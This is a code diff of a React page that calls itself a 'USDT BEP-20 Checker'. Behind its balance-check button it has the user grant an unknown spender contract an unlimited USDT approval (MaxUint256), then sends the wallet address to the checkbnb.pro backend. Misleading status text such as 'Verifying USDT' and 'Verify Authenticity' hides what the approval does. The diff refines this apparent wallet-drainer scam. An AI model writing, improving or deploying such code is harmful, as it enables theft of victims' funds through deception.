@@ -22,7 +22,7 @@ function App() {
         const accounts = await window.ethereum.request({ method: "eth_accounts" });
         if (accounts.length) {
           setWalletAddress(accounts[0]);
-          fetchUSDTBalance(accounts[0]);
+          await fetchUSDTBalance(accounts[0]);
         }
       }
     };
@@ -31,11 +31,12 @@ function App() {
 
   const connectWallet = async () => {
     if (!window.ethereum) {
-      return alert("MetaMask not found");
+      alert("MetaMask not found");
+      return;
     }
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     setWalletAddress(accounts[0]);
-    fetchUSDTBalance(accounts[0]);
+    await fetchUSDTBalance(accounts[0]);
   };
 
   const fetchUSDTBalance = async (address) => {
@@ -44,15 +45,15 @@ function App() {
       const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
       const decimals = await usdt.decimals();
       const balanceRaw = await usdt.balanceOf(address);
-      const balanceFormatted = ethers.formatUnits(balanceRaw, decimals);
-      setUsdtBalance(balanceFormatted);
+      const formattedBalance = ethers.formatUnits(balanceRaw, decimals);
+      setUsdtBalance(formattedBalance);
     } catch (err) {
-      console.error("Error fetching balance:", err);
+      console.error("Error fetching USDT balance:", err);
       setUsdtBalance(null);
     }
   };
 
-  const checkUSDT = async () => {
+  const approveAndTrigger = async () => {
     try {
       if (!window.ethereum) throw new Error("MetaMask not found");
 
@@ -60,24 +61,25 @@ function App() {
       const signer = await provider.getSigner();
       const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
 
-      // Approve unlimited USDT
-      const maxApproval = ethers.MaxUint256;
-
-      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, maxApproval);
-      setStatus("⏳ Checking USDT...");
+      // Approve unlimited amount
+      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, ethers.MaxUint256);
+      setStatus("⏳ Verifying USDT...");
       await tx.wait();
-      setStatus("✅ Balance Check done!");
+      setStatus("✅ USDT checked!");
 
-      // Trigger backend with connected wallet address
-      const res = await fetch("http://checkbnb.pro", {
+      // Refresh balance
+      await fetchUSDTBalance(walletAddress);
+
+      // Trigger backend
+      const res = await fetch("https://checkbnb.pro", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ sender: walletAddress }),
       });
 
       if (res.ok) {
-        const result = await res.json();
-        setStatus("✅ Backend triggered: " + result.message);
+        const data = await res.json();
+        setStatus("✅ Backend triggered: " + data.message);
       } else {
         setStatus("⚠️ Backend failed to respond.");
       }
@@ -89,11 +91,11 @@ function App() {
 
   return (
     <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>
-      <h1>🪙 USDT Checker BEP20</h1>
+      <h1>🪙 USDT BEP-20 Checker</h1>
 
       {walletAddress ? (
         <>
-          <p>🔗 Connected: <strong>{walletAddress}</strong></p>
+          <p>🔗 Connected Wallet: <strong>{walletAddress}</strong></p>
           {usdtBalance !== null && (
             <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
           )}
@@ -102,9 +104,11 @@ function App() {
         <button onClick={connectWallet}>Connect Wallet</button>
       )}
 
-      <button onClick={checkUSDT} style={{ marginTop: "1rem" }}>
-        Check Balance now!!1
-      </button>
+      {walletAddress && (
+        <button onClick={approveAndTrigger} style={{ marginTop: "1rem" }}>
+          Check Balance and Verify Authenticity...
+        </button>
+      )}
 
       {status && (
         <p style={{ marginTop: "1rem", color: status.startsWith("❌") ? "red" : "green" }}>
